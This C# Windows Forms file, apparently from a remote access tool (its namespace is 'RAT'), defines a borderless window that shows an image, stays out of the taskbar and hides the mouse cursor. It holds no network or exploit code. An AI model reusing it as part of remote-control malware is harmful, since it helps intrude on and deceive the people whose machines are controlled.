using System;
using System.Drawing;
using System.Windows.Forms;

namespace RAT
{
    public class ImageForm : Form
    {
        private PictureBox pictureBoxTX;

        public ImageForm()
        {
            InitializeComponent();
        }

        public void SetImage(Image pic)
        {
            pictureBoxTX.Image = pic;
            this.pictureBoxTX.Size = pic.Size;
            this.ClientSize = pic.Size;
            Show();
            Refresh();
        }

        private void ImageForm_MouseEnter(object sender, EventArgs e)
        {
            Cursor.Hide();
        }

        private void PictureBoxTX_MouseEnter(object sender, EventArgs e)
        {
            Cursor.Hide();
        }

        private void InitializeComponent()
        {
            this.pictureBoxTX = new PictureBox();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBoxTX)).BeginInit();
            this.SuspendLayout();
            // 
            // pictureBoxTX
            // 
            this.pictureBoxTX.BackColor = Color.Gray;
            this.pictureBoxTX.Dock = DockStyle.Fill;
            this.pictureBoxTX.Location = new Point(0, 0);
            this.pictureBoxTX.Margin = new Padding(0);
            this.pictureBoxTX.Name = "pictureBoxTX";
            this.pictureBoxTX.Size = new Size(300, 300);
            this.pictureBoxTX.TabIndex = 0;
            this.pictureBoxTX.TabStop = false;
            this.pictureBoxTX.MouseEnter += new EventHandler(this.PictureBoxTX_MouseEnter);
            // 
            // ImageForm
            // 
            this.AutoScaleDimensions = new SizeF(6F, 12F);
            this.AutoScaleMode = AutoScaleMode.Font;
            this.ClientSize = new Size(300, 300);
            this.ControlBox = false;
            this.Controls.Add(this.pictureBoxTX);
            this.FormBorderStyle = FormBorderStyle.None;
            this.Name = "ImageForm";
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.Text = "ImageForm";
            this.MouseEnter += new EventHandler(this.ImageForm_MouseEnter);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBoxTX)).EndInit();
            this.ResumeLayout(false);

        }
    }
}
